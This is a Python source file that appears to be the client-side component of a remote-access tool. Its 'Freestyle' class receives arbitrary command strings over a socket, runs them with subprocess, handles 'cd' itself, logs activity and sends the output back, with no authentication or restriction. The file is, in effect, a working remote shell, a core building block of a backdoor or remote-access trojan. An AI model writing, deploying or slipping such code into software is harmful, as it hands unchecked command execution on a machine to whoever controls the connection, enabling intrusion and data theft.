import socket
import sys
from subprocess import PIPE, Popen, CalledProcessError, call
from datetime import datetime
from threading import Thread
import subprocess
import time
import os


class Freestyle:
    def __init__(self, soc, log, hostname, localIP):
        self.soc = soc
        self.log_path = log
        self.hostname = hostname
        self.localIP = localIP

    def get_date(self):
        d = datetime.now().replace(microsecond=0)
        dt = str(d.strftime("%b %d %Y %I.%M.%S %p"))

        return dt

    def logIt(self, logfile=None, debug=None, msg=''):
        dt = self.get_date()
        if debug:
            print(f"{dt}: {msg}")

        if logfile is not None:
            try:
                if not os.path.exists(logfile):
                    with open(logfile, 'w') as lf:
                        lf.write(f"{dt}: {msg}\n")
                        return True

                else:
                    with open(logfile, 'a') as lf:
                        lf.write(f"{dt}: {msg}\n")
                    return True

            except FileExistsError:
                pass

    def logIt_thread(self, log_path=None, debug=False, msg=''):
        self.logit_thread = Thread(target=self.logIt, args=(log_path, debug, msg), name="Log Thread")
        self.logit_thread.start()
        return

    def free_style(self):
        def run_command():
            if str(self.cmd).lower()[:2] == "cd":
                os.chdir(self.cmd[3:])
                # self.soc.send("END".encode())

            output = subprocess.getoutput(self.cmd)
            self.soc.send(f"{output}\n".encode())
            sys.stdout.flush()

        while True:
            try:
                self.logIt_thread(self.log_path, msg=f'Waiting for command...')
                self.cmd = self.soc.recv(1024).decode()
                self.logIt_thread(self.log_path, msg=f'Command: {self.cmd}')

                if self.cmd == "back":
                    return

                # Run Commands
                self.logIt_thread(self.log_path, msg=f'Calling self.run.command()...')
                run_command()

            except (WindowsError, socket.error) as e:
                return
